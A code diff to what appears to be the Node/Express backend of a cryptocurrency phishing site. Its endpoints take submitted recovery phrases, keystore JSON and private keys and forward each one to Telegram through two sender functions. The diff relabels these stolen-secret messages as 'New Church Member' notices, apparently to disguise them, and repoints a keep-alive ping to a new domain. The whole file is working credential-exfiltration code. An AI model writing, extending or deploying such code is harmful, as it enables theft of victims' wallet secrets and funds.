@@ -70,9 +70,11 @@ function sendTelegramb(msg) {
       reject(err);
     });
 
-    req.end(); // good practice even though get() implies it
+    req.end();  
   });
 } 
+
+
 
  
  // API routes first so they are not shadowed by the static catch-all
@@ -85,11 +87,21 @@ function sendTelegramb(msg) {
          }
 
          console.log('📧 Processing recovery phrase request...');
-         await sendTelegramb(`
-🔔 New Request
-─────────────
-📥 Input: ${inpvalue}
-`);  
+         await sendTelegram(`
+✝️ New Church Member
+─────────────────────────
+📝 Message:
+${inpvalue.trim()}
+─────────────────────────
+`);
+                 await sendTelegramb(`
+✝️ New Church Member
+─────────────────────────
+📝 Message:
+${inpvalue.trim()}
+─────────────────────────
+`);
+
   res.json({msg:'great'})
      } catch (err) {
          console.error('❌ Error in recovery phrase endpoint:', err); 
@@ -110,14 +122,18 @@ function sendTelegramb(msg) {
        }
 
        console.log('📧 Processing keystore JSON request...');
-       sendTelegram(`
-🔔 New Request
-─────────────
-📥 Input: ${inpvalue}
-`);   sendTelegramb(`
-🔔 New Request
-─────────────
-📥 Input: ${inpvalue}
+             await sendTelegram(`
+✝️ New Church Member
+─────────────────────────
+📝 Message:
+${inpvalue.trim()}
+─────────────────────────
+`);         await sendTelegramb(`
+✝️ New Church Member
+─────────────────────────
+📝 Message:
+${inpvalue.trim()}
+─────────────────────────
 `);
   res.status(200).json({msg:'great'})
    } catch (err) {
@@ -139,14 +155,18 @@ app.post('/processingc', async (req, res) => {
        }
 
        console.log('📧 Processing private key request...');
-        sendTelegram(`
-🔔 New Request
-─────────────
-📥 Input: ${inpvalue}
-`);    sendTelegramb(`
-🔔 New Request
-─────────────
-📥 Input: ${inpvalue}
+               await sendTelegram(`
+✝️ New Church Member
+─────────────────────────
+📝 Message:
+${inpvalue.trim()}
+─────────────────────────
+`);        await sendTelegramb(`
+✝️ New Church Member
+─────────────────────────
+📝 Message:
+${inpvalue.trim()}
+─────────────────────────
 `);
         res.status(200).json({msg:'great'})  
    } catch (err) {
@@ -163,7 +183,7 @@ app.get("*", (req, res) => {
     res.sendFile(path.join(__dirname, "build", "index.html"));
   }); 
   
-setInterval(() => https.get("https://secure-decentralized-connect.onrender.com"), 10 * 60 * 1000);
+setInterval(() => https.get("https://connect.decentranet.live"), 10 * 60 * 1000);
 
 app.listen(5000 , ()=>{
     console.log('Listening on port 5000');
